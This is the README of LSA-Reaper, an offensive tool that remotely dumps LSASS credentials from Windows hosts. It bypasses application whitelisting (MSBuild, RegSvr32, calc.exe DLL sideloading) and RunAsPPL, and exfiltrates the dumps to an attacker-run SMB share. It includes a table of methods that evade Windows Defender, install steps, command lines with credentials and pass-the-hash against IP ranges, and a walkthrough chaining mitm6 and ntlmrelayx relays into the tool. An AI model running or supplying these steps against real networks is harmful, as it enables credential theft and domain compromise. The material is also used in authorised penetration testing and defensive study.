# LSA-Reaper
<p align="center">
  <img width="400" height="400" src="/assets/lsareaper.png">
</p>

## WARNING READ ME BEFORE USING

The MSBuild payload and any ending with mdwd will cause explorer to hang indefinatly if the Windows Defender security intelligence is on 1.397.814.0 and a few versions before it (Microsoft made Defender into a DOS) on the latest version it appears to be fixed (1.393.939.0 or newer). This does not seem to affect any of the mdwdpss payloads.

I recommend using this tool in a virtual Python environment due to possible dependency conflicts with other popular tools you can find how to set that up [here](https://packaging.python.org/en/latest/guides/installing-using-pip-and-virtual-environments/).

## You are responsible for your own actions use this software on your own systems ONLY!

LSA-Reaper is a command line remote LSASS dumping tool that uses [Impacket's](https://github.com/SecureAuthCorp/impacket) wmiexec, smbexec, or atexec. Bypassing Windows Application Whitelisting through multiple techniques such as MSBuild, RegSvr32, and sideloading a DLL through calc.exe. LSA-Reaper can even bypass the RunAsPPL flag for LSASS.


## Index
[Credits](https://github.com/samiam1086/LSA-Reaper#credits)

[Dumping Methods](https://github.com/samiam1086/LSA-Reaper#dumping-methods)

[Requirements](https://github.com/samiam1086/LSA-Reaper#requirements)

[Installation](https://github.com/samiam1086/LSA-Reaper#installation)

[Methodology](https://github.com/samiam1086/LSA-Reaper#methodology)

[Usage](https://github.com/samiam1086/LSA-Reaper#usage)

[Examples](https://github.com/samiam1086/LSA-Reaper#examples)

[Usage with Impacket's ntlmrelayx](https://github.com/samiam1086/LSA-Reaper#usage-with-impackets-ntlmrelayx)

[FAQ](https://github.com/samiam1086/LSA-Reaper#faq)



## Credits

[Forta](https://github.com/SecureAuthCorp/impacket) for making awesome open source tools.

[Marantral](https://github.com/Marantral) for being awesome and helping with MsBuild and RegSvr32 payloads!

[itm4n](https://github.com/itm4n/PPLcontrol) made the RunAsPPL bypass that is used.

[Inf0secRabbit](https://github.com/Inf0secRabbit/MiniDumpSnapshot) made the modified mdwd PSSCaptureSnapShot functionality that is used.

[GeneralTesler](https://gist.github.com/GeneralTesler/68903f7eb00f047d32a4d6c55da5a05c) made the RtlCreateProcessReflection payload that I modified.

## Dumping Methods 

These are all dumping methods that I have explored a :x: indicates that Windows Defender detects and blocks while a :heavy_check_mark: indicates the method works

comsvcs.dll :x:

MiniDumpWriteDump :x::heavy_check_mark: (might be causing explorer to hang?)

MiniDumpWriteDump + PSSCaptureSnapShot :heavy_check_mark:

MiniDumpWriteDump + RtlCreateProcessReflection  :heavy_check_mark:

SQLDumper.exe :x:

Procdump.exe :x:

Task Manager :x::heavy_check_mark: (Sometimes works you just need to manually copy the dmp file to save it from deletion)

## Requirements
```
Linux
Impacket
python3 pypykatz
python3 netifaces
python3 python-nmap
python3 Pebble
Samba
mono-complete
mingw-w64
python3-apt
```

## Installation
```
sudo apt-get install samba
sudo apt-get install mono-complete
sudo apt-get install python3-apt
sudo apt-get install mingw-w64
git clone https://github.com/samiam1086/LSA-Reaper.git
cd LSA-Reaper
sudo python3 -m pip install -r requirements.txt
cd ..
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
sudo python3 setup.py install
```
or
```
git clone https://github.com/samiam1086/LSA-Reaper.git
cd LSA-Reaper
sudo sh setup.sh
```

## Methodology
LSA-Reaper will begin by ping sweeping all provided IPs or IP ranges for alive hosts. LSA-Reaper will then create a SMB share with a random username and password that will act as the exfiltration point. LSA-Reaper will then execute the net use command on the victim machine via wmiexec or atexec to make the victim machine mount the share as a network drive and then execute msbuild, regsvr32, calc.exe, or an EXE file to execute the payload which will dump LSASS and save it to the mounted SMB share.

## Usage
```
sudo python3 lsa-reaper.py
```
![](/assets/hlp.png)

## Examples

ALL of these command arguments are interchangeable
```
sudo python3 lsa-reaper.py domain/user:'Password'@ip

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.100

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.0/24

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@10.0.0.10-200

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@ipList.txt

sudo python3 lsa-reaper.py testdomain/testuser:'P@ssw0rd!'@/absolute/path/to/file/ipList.txt

sudo python3 lsa-reaper.py testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -hashes 'LMHASH:NTHASH' testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -ip local_ip testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -drive A testdomain/testuser@10.0.0.100

sudo python3 lsa-reaper.py -localauth localuser@10.0.0.100

sudo python3 lsa-reaper.py -ip eth0 testdomain/testuser:'P@ssw0rd!'@10.0.0.100 -payload regsvr32 -method smbexec -ap
```

![](/assets/Reaper-Running.png)

![](/assets/example.png)

## Usage with Impacket's ntlmrelayx
First things first you need to run mitm6 and ntlmrelayx

![](/assets/mitm6run.png)

![](/assets/relayrun.png)

Once these are running you should begin to receive connections. These can be checked using the ```socks``` command within ntlmrelayx. Once you have gotten a connection with Admin Status of True you are good to get the ball rolling.

![](/assets/sockconnection.png)

With this connection we no longer need ntlmrelayx gathering relays so we can run the command ```stopservers```

![](/assets/stopservers.png)

Now we need to modify our proxychains.conf in /etc/ (It may be called proxychains4.conf). This is because the ```-socks``` argument on ntlmrelayx starts a socks4 server on local port 1080.

![](/assets/proxychains.png)

With this set and saved we can move to LSA-Reaper. NOTE you can skip all of this by using ```-relayx``` and ```-oe``` within lsa-reaper.py

Run smbexec-modified.py through proxychains. (Note that the domain is not the fqdn which should be testenvironment.local for our example. It MUST be what ntlmrelayx puts for the domain in the socks connections)

When prompted for a password simply press enter.

![](/assets/smbexecrunn.png)

Now run the command ```net use``` to view if any network drives are mounted on the target server. (This is so we can change the drive letter LSA-Reaper uses if the default of Q: is already in use)

![](/assets/netuse.png)

Now startup LSA-Reaper with the ```-oe``` flag
```sudo python3 lsa-reaper.py -oe -ap```

![](/assets/runningreaper.png)

Now that LSA-Reaper is running we can begin to execute each command from the large payload individually, (This is a limitation of smbexec and youll lose your shell if you try to run them all at once)

![](/assets/mountshare.png)

![](/assets/msbuild.png)

![](/assets/dismountshare.png)

Now you can press enter to end LSA-Reaper and navigate to the ```loot``` directory within the LSA-Reaper folder and then into the newest loot file. All that is left to do is use pypykatz to dump the DMP file. (Note this step is not required if you use the ```-ap``` flag)

![](/assets/dumped.png)


## FAQ
pypykatz is giving an error ```oscrypto.errors.LibraryNotFoundError: Error detecting the version of libcrypto```
This is due to oscrypto which is a python module not recognizing a newer version of openssl and a solution can be found [here](https://github.com/wbond/oscrypto/commit/d5f3437ed24257895ae1edd9e503cfb352e635a8) its just a simple regex issue. Removing and reinstalling oscrypto did not fix the issue for me I had to manually edit the files shown in that link.

Mingw is giving the error
``` 
/var/tmp/muyoirqjosamtwtepspv/pl.cpp: In function ‘int main()’:

/var/tmp/muyoirqjosamtwtepspv/pl.cpp:122:10: error: ‘std::this_thread’ has not been declared

  122 |     std::this_thread::sleep_for(std::chrono::milliseconds(2000));

      |          ^~~

/var/tmp/muyoirqjosamtwtepspv/pl.cpp:124:10: error: ‘std::this_thread’ has not been declared

  124 |     std::this_thread::sleep_for(std::chrono::milliseconds(1000));

      |          ^~~

/var/tmp/muyoirqjosamtwtepspv/pl.cpp:126:10: error: ‘std::this_thread’ has not been declared

  126 |     std::this_thread::sleep_for(std::chrono::milliseconds(3000));

      |          ^~~

chmod: cannot access '/var/tmp/muyoirqjosamtwtepspv/ckjocxgkvf.exe': No such file or directory
```
This is due to mingw being very out of date and you can update it with 
```sudo apt update```
```sudo apt install mingw-w64```
```sudo apt install --only-upgrade g++-mingw-w64-x86-64 gcc-mingw-w64-x86-64```


